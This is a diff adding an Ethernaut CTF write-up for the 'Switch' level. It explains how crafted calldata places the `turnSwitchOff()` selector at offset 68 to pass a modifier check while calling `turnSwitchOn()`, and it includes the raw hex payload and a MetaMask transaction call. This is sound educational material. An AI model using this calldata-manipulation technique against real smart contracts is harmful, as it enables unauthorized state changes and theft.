@@ -1830,3 +1830,80 @@ Expolit contract does not have any `receive()` or `fallback()` function, so `.se
 ### Level Completed
 ![Level Complete Output](assets/GateKeeperThree.png)
 
+
+# Ethernaut Level 29: **Switch**
+
+### Strategy
+
+The goal is to **flip the switch** (i.e., set `switchOn = true`). But the `turnSwitchOn()` function is protected by two layers of defense:
+
+1. **`onlyThis` modifier**: Requires that only the contract itself can call `turnSwitchOn()` (i.e., `msg.sender == address(this)`).
+2. You can only reach `turnSwitchOn()` through `flipSwitch(bytes memory _data)`, but that has an `onlyOff` modifier that enforces:
+   - The calldata must contain the function selector of `turnSwitchOff()` at a specific offset (`calldata[68:72]`).
+
+So, the **challenge is to trick `onlyOff`** into thinking we're calling `turnSwitchOff()`, but actually **trigger `turnSwitchOn()`** through low-level call forwarding.
+
+---
+
+### Vulnerability Summary
+
+- The contract allows low-level `call()` with arbitrary calldata via `flipSwitch()`.
+- The `onlyOff` modifier only inspects 4 bytes of the calldata at a fixed offset.
+- We can **fake that offset to pass the check**, and still encode an internal call to `turnSwitchOn()` in `_data`.
+
+---
+
+### Exploit Steps
+
+#### 1. Prepare custom crafted calldata
+
+The function we are calling is:
+
+```solidity
+flipSwitch(bytes memory _data)
+```
+
+We need:
+- First 4 bytes: selector of `flipSwitch(bytes)`
+- ABI-encoded `_data`: a call to `turnSwitchOn()`
+- Bytes at offset 68 (calldata[68:72]): exactly equal to `bytes4(keccak256("turnSwitchOff()"))` → `0x606e1500`
+
+```js
+const bypass = '0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000';
+```
+
+---
+
+#### 2. Send transaction with the bypass data
+
+I used browser console (via MetaMask and Web3) to send this raw transaction:
+
+```js
+await ethereum.request({
+  method: 'eth_sendTransaction',
+  params: [{
+    from: (await ethereum.request({ method: 'eth_requestAccounts' }))[0],
+    to: instance, // contract address from Ethernaut
+    data: bypass
+  }]
+});
+```
+
+---
+
+#### 3. Confirm switch is on
+
+Check the contract state:
+
+```js
+await contract.switchOn(); // returns true 
+```
+
+---
+
+### Final Notes
+
+This challenge was about **precise manipulation of calldata and function selectors**. It taught how Solidity's ABI encoding works under the hood and how raw bytecode can be used to **bypass superficial validation**.
+
+### Level Completed
+![Level Complete Output](assets/switch.png)
